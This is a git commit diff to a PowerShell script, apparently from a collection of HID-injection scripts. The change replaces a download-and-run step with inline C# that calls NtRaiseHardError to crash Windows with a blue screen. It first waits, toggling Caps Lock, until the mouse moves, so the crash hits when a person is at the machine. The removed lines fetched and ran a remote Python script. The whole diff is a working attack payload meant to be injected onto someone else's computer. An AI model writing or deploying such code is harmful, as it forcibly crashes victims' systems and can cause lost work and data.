6c8b60614d0797cc06cb359d89e0312c48862798
Simen <97337442+simen64@users.noreply.github.com>
2024-03-15 08:18:46 +0100

    Update bluescreen-activator.ps1

--- Bluescreen-mouse/bluescreen-activator.ps1
+++ Bluescreen-mouse/bluescreen-activator.ps1
@@ -1,4 +1,45 @@
-cd "$env:USERPROFILE\Downloads"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/Bluescreen-mouse/bluescreen-mouse.py" -OutFile blue.py
+function Invoke-BSOD {
+$source = @"
+using System;
+using System.Runtime.InteropServices;
 
-python.exe blue.py
+public static class CS{
+	[DllImport("ntdll.dll")]
+	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+	[DllImport("ntdll.dll")]
+	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+	public static unsafe void Kill(){
+		Boolean tmp1;
+		uint tmp2;
+		RtlAdjustPrivilege(19, true, false, out tmp1);
+		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
+	}
+}
+"@
+    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
+    $comparams.CompilerOptions = '/unsafe'
+    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
+    [CS]::Kill()
+}
+
+function Target-Comes {
+	Add-Type -AssemblyName System.Windows.Forms
+	$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+	$o=New-Object -ComObject WScript.Shell
+	
+		while (1) {
+			$pauseTime = 1
+			if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+				break
+			}
+			else {
+				$o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+			}
+		}
+	}
+
+Target-Comes
+
+Invoke-BSOD
